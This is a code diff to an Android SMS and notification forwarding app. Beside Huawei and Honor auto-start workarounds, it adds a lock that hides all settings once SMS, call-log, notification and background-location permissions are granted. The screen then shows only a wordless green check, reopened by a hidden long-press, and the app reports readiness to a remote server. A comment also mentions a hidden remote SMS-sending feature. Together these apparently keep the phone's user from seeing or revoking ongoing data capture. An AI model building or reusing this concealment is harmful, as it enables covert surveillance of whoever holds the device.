@@ -82,6 +82,12 @@ import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog
 import com.xuexiang.xui.widget.picker.XSeekBar
 import com.xuexiang.xui.widget.picker.widget.builder.OptionsPickerBuilder
 import com.xuexiang.xui.widget.picker.widget.listener.OnOptionsSelectListener
+import cn.ppps.forwarder.entity.MsgInfo
+import cn.ppps.forwarder.utils.Worker
+import cn.ppps.forwarder.workers.SendWorker
+import com.google.gson.Gson
+import java.util.Date
+import androidx.work.workDataOf
 import com.xuexiang.xutil.XUtil
 import com.xuexiang.xutil.XUtil.getPackageManager
 import com.xuexiang.xutil.file.FileUtils
@@ -249,6 +255,8 @@ class SettingsFragment : BaseFragment<FragmentSettingsBinding?>(), View.OnClickL
         initAppSpinner()
         //从系统通知设置页返回时，刷新「功能8」的状态
         refreshNotifySettingSwitch()
+        //【新增】必要权限全就绪时锁住设置界面，防止误触把权限关掉
+        refreshLockState()
     }
 
     override fun initListeners() {
@@ -1377,10 +1385,44 @@ class SettingsFragment : BaseFragment<FragmentSettingsBinding?>(), View.OnClickL
                     "com.samsung.android.sm_cn/com.samsung.android.sm.ui.ram.AutoRunActivity", "com.samsung.android.sm_cn/com.samsung.android.sm.ui.appmanagement.AppManagementActivity", "com.samsung.android.sm_cn/com.samsung.android.sm.ui.cstyleboard.SmartManagerDashBoardActivity", "com.samsung.android.sm_cn/.ui.ram.RamActivity", "com.samsung.android.sm_cn/.app.dashboard.SmartManagerDashBoardActivity", "com.samsung.android.sm/com.samsung.android.sm.ui.ram.AutoRunActivity", "com.samsung.android.sm/com.samsung.android.sm.ui.appmanagement.AppManagementActivity", "com.samsung.android.sm/com.samsung.android.sm.ui.cstyleboard.SmartManagerDashBoardActivity", "com.samsung.android.sm/.ui.ram.RamActivity", "com.samsung.android.sm/.app.dashboard.SmartManagerDashBoardActivity", "com.samsung.android.lool/com.samsung.android.sm.ui.battery.BatteryActivity", "com.samsung.android.sm_cn", "com.samsung.android.sm"
                 )
             )
+            // 【已改造 · 2026-09-29 真机实测】华为 nova6 / HarmonyOS
+            //
+            // 实测结论（逐条试过）：
+            //   ✗ .startupmgr.ui.StartupNormalAppListActivity  -> SecurityException，
+            //     要求 com.huawei.permission.external_app_settings.USE_COMPONENT（签名级）
+            //   ✗ .appcontrol.activity.StartupAppControlActivity -> 同样被拒（就是「应用启动管理」那页）
+            //   ✗ .startupmgr.ui.StartupAppListActivity / AppControlActivity /
+            //     .optimize.process.ProtectActivity / .optimize.bootstart.BootStartActivity
+            //     -> Activity does not exist
+            //   ✗ 隐式 Action "huawei.intent.action.HSM_STARTUPAPP_MANAGER"
+            //     -> 系统选择器报「没有应用可执行此操作」
+            //   ✓ .mainscreen.MainScreenActivity -> 能打开，而且首页上就有
+            //     「应用启动管理」入口，点进去正是 StartupAppControlActivity（实测可达）
+            //
+            // 所以顺序反过来：**先跳得进去的手机管家首页**，再靠弹窗告诉用户点哪。
+            // 精确那一页在华为上是跳不进去的（签名权限），不要再试了。
             put(
                 "HUAWEI", listOf(
-                    "com.huawei.systemmanager/.startupmgr.ui.StartupNormalAppListActivity",  //EMUI9.1.0(方舟,9.0)
-                    "com.huawei.systemmanager/.appcontrol.activity.StartupAppControlActivity", "com.huawei.systemmanager/.optimize.process.ProtectActivity", "com.huawei.systemmanager/.optimize.bootstart.BootStartActivity", "com.huawei.systemmanager" //最后一行可以写包名, 这样如果签名的类路径在某些新版本的ROM中没找到 就直接跳转到对应的安全中心/手机管家 首页.
+                    // ★ 实测唯一能打开的入口
+                    "com.huawei.systemmanager/.mainscreen.MainScreenActivity",
+                    // 下面几条在旧 EMUI 上可能有效，留着给老机型
+                    "com.huawei.systemmanager/.startupmgr.ui.StartupNormalAppListActivity",
+                    "com.huawei.systemmanager/.appcontrol.activity.StartupAppControlActivity",
+                    // 纯包名兜底
+                    "com.huawei.systemmanager"
+                )
+            )
+            // 【新增】荣耀。2020 年底独立后改了包名（com.hihonor.*），
+            // 原项目表里没有荣耀，"HONOR" 会一路掉到 else 分支。
+            put(
+                "HONOR", listOf(
+                    "com.hihonor.systemmanager/.startupmgr.ui.StartupNormalAppListActivity",
+                    "com.hihonor.systemmanager/.startupmgr.ui.StartupAppListActivity",
+                    "com.hihonor.systemmanager/.appcontrol.activity.StartupAppControlActivity",
+                    "com.hihonor.systemmanager",
+                    // 老荣耀（还叫华为荣耀时）用的仍是华为那套
+                    "com.huawei.systemmanager/.startupmgr.ui.StartupNormalAppListActivity",
+                    "com.huawei.systemmanager"
                 )
             )
             put(
@@ -1474,9 +1516,170 @@ class SettingsFragment : BaseFragment<FragmentSettingsBinding?>(), View.OnClickL
         }
     }
 
+    // ==================================================================================
+    //  【新增 · 2026-09-29】权限就绪后锁定设置界面
+    //
+    //  背景（用户要求）：
+    //      「所有必要权限获取成功之后，给VPS发送一下信息，然后APK内把设置界面隐藏起来
+    //        （无法关闭），仅仅提示：状态正常。防止误触解除权限」
+    //
+    //  做三件事：
+    //    ① 检测四类必要权限是否全部就位（短信 / 通话 / 通知使用权 / 定位）
+    //    ② 就位 -> 隐藏整个设置内容，只显示「状态正常」；并把「已就绪」上报一次给服务器
+    //    ③ 长按「状态正常」可以临时解锁 —— 留个出口，
+    //       否则哪天要改 secret 或换服务器，界面上就没门路了
+    //
+    //  「临时」的含义：解锁只在本次进入页面内有效，退出重进又会锁上。
+    //  这样既能防止误触，又不会把自己彻底关在门外。
+    // ==================================================================================
+    /** 本次进入页面是否被临时解锁（不持久化，退出即失效） */
+    private var settingsUnlockedTemporarily = false
+
+    /** 四类必要权限是否都已就位 */
+    private fun allRequiredPermissionsReady(): Boolean {
+        return try {
+            val ctx = requireContext()
+            // ⚠️ 这里只列【转发真正需要的】权限，不要照抄功能开关的申请列表。
+            //
+            // 教训（2026-09-29 在 nova6 上实测发现）：一开始照抄了功能1/2 的完整申请列表，
+            // 结果 SEND_SMS / CALL_PHONE / WRITE_CONTACTS 三项用户根本没授（也不需要），
+            // 判定永远为 false，「状态正常」出不来。
+            //
+            //   · 收发短信转发：只要「收」和「读」，不需要「发」（SEND_SMS 是隐藏的远程发短信功能才用）
+            //   · 来电转发：只要通话记录 + 手机状态，不需要拨号/写联系人
+            //   · 已发送短信：读系统短信库（type=2），同样不需要 SEND_SMS
+            //
+            // 功能1：短信（收 + 读）
+            val smsOk = XXPermissions.isGrantedPermissions(ctx, listOf(
+                PermissionLists.getReceiveSmsPermission(),
+                PermissionLists.getReadSmsPermission()
+            ))
+            // 功能2：通话（通话记录 + 手机状态）
+            val callOk = XXPermissions.isGrantedPermissions(ctx, listOf(
+                PermissionLists.getReadCallLogPermission(),
+                PermissionLists.getReadPhoneStatePermission()
+            ))
+            // 功能3：通知使用权（不是运行时权限，得单独查）
+            val notifyOk = CommonUtils.isNotificationListenerServiceEnabled(ctx)
+            // 功能4：定位
+            val locOk = XXPermissions.isGrantedPermissions(ctx, listOf(
+                PermissionLists.getAccessFineLocationPermission(),
+                PermissionLists.getAccessCoarseLocationPermission(),
+                PermissionLists.getAccessBackgroundLocationPermission()
+            ))
+            smsOk && callOk && notifyOk && locOk
+        } catch (e: Exception) {
+            // 任何一项判断出错都当作「没就绪」—— 宁可多显示设置，也不要把用户锁在外面
+            Log.e(TAG, "检查必要权限时出错: ${e.message}")
+            false
+        }
+    }
+
+    /** 按当前权限状态切换「状态正常」/「完整设置」两种界面 */
+    private fun refreshLockState() {
+        val ready = allRequiredPermissionsReady()
+        val locked = ready && !settingsUnlockedTemporarily
+
+        binding!!.layoutStatusOk.visibility = if (locked) View.VISIBLE else View.GONE
+        binding!!.layoutSettingsContent.visibility = if (locked) View.GONE else View.VISIBLE
+
+        if (!locked) return
+
+        // 【2026-09-29 改】这里原来会往「状态正常」下面写一段说明文字。
+        // 用户要求「只要一个绿色的对勾，其它什么话都不说」，所以文字全去掉了，
+        // 只留一个对勾（文本定义在 strings.xml 的 status_ok_mark）。
+
+        // 长按临时解锁（这是唯一的出口，别删）
+        binding!!.layoutStatusOk.setOnLongClickListener {
+            settingsUnlockedTemporarily = true
+            refreshLockState()
+            XToastUtils.info(R.string.status_ok_unlocked)
+            true
+        }
+
+        // 首次就绪时往服务器报一次，之后不再重复
+        if (!SettingUtils.permissionReadyReported) {
+            SettingUtils.permissionReadyReported = true
+            reportPermissionReady()
+        }
+    }
+
+    /**
+     * 把「权限已就绪」上报给服务器。
+     *
+     * 复用现有的通知转发链路（type = notify），所以服务端不用改任何东西，
+     * 面板的消息流里能直接看到这条。
+     */
+    private fun reportPermissionReady() {
+        try {
+            val content = buildString {
+                append("【就绪】全部必要权限已获取，设置界面已锁定")
+                append("\n")
+                append("短信 / 通话 / 通知使用权 / 定位：均已授权")
+                append("\n")
+                append("设备：").append(SettingUtils.extraDeviceMark)
+            }
+            // ⚠️ type 必须用 "app"，不是 "notify"！
+            // 数据库里的通知转发规则是 type=app（Rule id=3），用 "notify" 匹配不到，
+            // 消息会被 SendWorker 直接丢掉 —— v48 装机后就踩了这个坑，上报没发出去。
+            // （"notify" 是服务端那边的叫法，手机端内部叫 "app"。）
+            // 另外 MsgInfo 的 simSlot / subId 是 Int（不是 String），这里用默认值。
+            val msg = MsgInfo(
+                type = "app",
+                from = getString(R.string.app_name),
+                content = content,
+                date = Date(),
+                simInfo = ""
+            )
+            val request = OneTimeWorkRequestBuilder<SendWorker>()
+                .setInputData(workDataOf(Worker.SEND_MSG_INFO to Gson().toJson(msg)))
+                .build()
+            WorkManager.getInstance(XUtil.getContext()).enqueue(request)
+            Log.i(TAG, "已上报「权限就绪」")
+        } catch (e: Exception) {
+            Log.e(TAG, "上报权限就绪失败: ${e.message}")
+            // 上报失败不影响锁定本身；把标记回退，下次进页面再试
+            SettingUtils.permissionReadyReported = false
+        }
+    }
+
     //跳转自启动页面
     private fun startToAutoStartSetting(context: Context) {
         Log.e("Util", "******************The current phone model is:" + Build.MANUFACTURER)
+
+        // 【新增 · 2026-09-29 真机实测】华为/荣耀特殊处理。
+        //
+        // 原因：华为把「应用启动管理」那一页用签名权限锁死了，第三方应用**直连不了**
+        //       （显式 Component 报 SecurityException；隐式 Action 也不行）。
+        //       唯一能打开的是【手机管家首页】，而首页上正好有「应用启动管理」入口。
+        //
+        //       既然只能到首页，那就必须在跳转前把「点哪」说清楚 ——
+        //       否则用户跳过去看到的是手机管家首页，会以为又没反应。
+        val brand = Build.BRAND.lowercase(Locale.ROOT)
+        if (brand == "huawei" || brand == "honor") {
+            val shown = try {
+                MaterialDialog.Builder(context)
+                    .title(R.string.auto_start_huawei_dialog_title)
+                    .content(R.string.auto_start_huawei_dialog_content)
+                    .positiveText(R.string.auto_start_huawei_dialog_go)
+                    .onPositive { _: MaterialDialog?, _: DialogAction? -> jumpToAutoStartPage(context) }
+                    .negativeText(R.string.auto_start_dialog_ok)
+                    .cancelable(true)
+                    .show()
+                true
+            } catch (e: Exception) {
+                Log.e("Util", "华为自启动说明弹窗失败: " + e.message)
+                false
+            }
+            if (shown) return
+            // 弹窗失败（context 不是 Activity 等）就径直跳，用户至少到了手机管家
+        }
+
+        jumpToAutoStartPage(context)
+    }
+
+    // 真正执行跳转（原来写在 startToAutoStartSetting 里的那段）
+    private fun jumpToAutoStartPage(context: Context) {
         val entries: MutableSet<MutableMap.MutableEntry<String?, List<String?>?>> = hashMap.entries
         var has = false
         for ((manufacturer, actCompatList) in entries) {
@@ -1507,19 +1710,51 @@ class SettingsFragment : BaseFragment<FragmentSettingsBinding?>(), View.OnClickL
             }
         }
         if (!has) {
-            XToastUtils.info(R.string.tips_compatible_solution)
-            try {
-                val intent = Intent()
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                intent.action = "android.settings.APPLICATION_DETAILS_SETTINGS"
-                intent.data = Uri.fromParts("package", context.packageName, null)
-                context.startActivity(intent)
+            // 【已改造】所有候选入口都没命中时。
+            //
+            // 原来只是弹个「请自行设置」的 toast 就跳去应用详情页 —— 用户根本不知道
+            // 该点哪一步，而自启动又是保活的关键环节，含糊不得。
+            // 现在改成弹窗，把该机型专属的手动路径写清楚（getAutoStartTips 按品牌给文案），
+            // 用户可以选择照做，或者让它带你去应用设置页。
+            val goAppDetail = {
+                try {
+                    val intent = Intent()
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    intent.action = "android.settings.APPLICATION_DETAILS_SETTINGS"
+                    intent.data = Uri.fromParts("package", context.packageName, null)
+                    context.startActivity(intent)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                    Log.e("Util", "打开应用详情页失败: " + e.message)
+                    try {
+                        val intent = Intent(Settings.ACTION_SETTINGS)
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        context.startActivity(intent)
+                    } catch (e2: Exception) {
+                        Log.e("Util", "连系统设置都打不开: " + e2.message)
+                    }
+                }
+            }
+
+            val tips = getAutoStartTips()
+            val shown = try {
+                MaterialDialog.Builder(context)
+                    .title(R.string.auto_start_dialog_title)
+                    .content(tips + "\n\n" + context.getString(R.string.auto_start_dialog_hint))
+                    .positiveText(R.string.auto_start_dialog_go)
+                    .onPositive { _: MaterialDialog?, _: DialogAction? -> goAppDetail() }
+                    .negativeText(R.string.auto_start_dialog_ok)
+                    .cancelable(true)
+                    .show()
+                true
             } catch (e: Exception) {
-                e.printStackTrace()
-                Log.e("Util", "******************e:" + e.message)
-                val intent = Intent(Settings.ACTION_SETTINGS)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                context.startActivity(intent)
+                // 弹窗失败（比如 context 不是 Activity）就退回原来的做法
+                Log.e("Util", "显示自启动指引弹窗失败: " + e.message)
+                false
+            }
+            if (!shown) {
+                XToastUtils.info(R.string.tips_compatible_solution)
+                goAppDetail()
             }
         }
     }
